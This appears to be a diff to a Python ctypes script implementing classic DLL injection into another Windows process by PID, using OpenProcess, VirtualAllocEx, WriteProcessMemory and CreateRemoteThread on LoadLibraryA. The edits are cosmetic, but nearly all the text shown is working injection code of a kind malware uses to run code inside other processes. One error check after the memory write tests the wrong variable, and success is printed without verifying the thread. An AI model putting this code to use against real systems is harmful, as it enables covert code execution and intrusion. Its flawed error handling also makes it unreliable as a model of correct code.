@@ -20,8 +20,8 @@ def reflective_injection():
     # Runtime - Windows API functions process
     # OpenProcess() --> Injector attaches to host process
     #       |---> VirtualAllocEx() --> Memory allocates for host process
-    #             |--->WriteProcessMemory() --> Copy DLL to host process
-    #                  |--->CreateRemoteThread() --> Code execution
+    #             |---> WriteProcessMemory() --> Copy DLL to host process
+    #                  |---> CreateRemoteThread() --> Code execution
 
     PAGE_READWRITE = 0x04
     PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
@@ -30,7 +30,7 @@ def reflective_injection():
     dwDesiredAccess  = PROCESS_ALL_ACCESS
     bInheritHandle   = False
     dwProcessId      = int(PID)
-    # opens the process object via OpenProcess()
+    # Opens the process object via OpenProcess()
     loading_process = kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
     if not loading_process:
         print("[!] Error attaching to the process: %s" %dwProcessId)
@@ -49,12 +49,11 @@ def reflective_injection():
     else:
         print("[+] Host process memory allocation sucess")
         
-    written = c_int(0)
     hProcess         = loading_process
     lpBaseAddress    = allocate_memory
     lpBuffer         = dll_name
     nSize            = dll_length
-    lpNumberOfBytesWritten = written
+    lpNumberOfBytesWritten = byref(c_int(0))
     # Copies the .DLL to the host process
     write_memory = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
     if not loading_process:
@@ -65,14 +64,13 @@ def reflective_injection():
     h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
     h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
     
-    thread_id = c_ulong(0)
     hProcess            = loading_process
     lpThreadAttributes  = None
     dwStackSize         = 0
     lpStartAddress      = h_loadlib
     lpParameter         = allocate_memory
     dwCreationFlags     = 0
-    lpThreadId          = byref(thread_id)
+    lpThreadId          = byref(c_ulong(0))
     code_execution = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize,
                                                  lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
     print("[+] Successful injection into PID: %s" %PID)
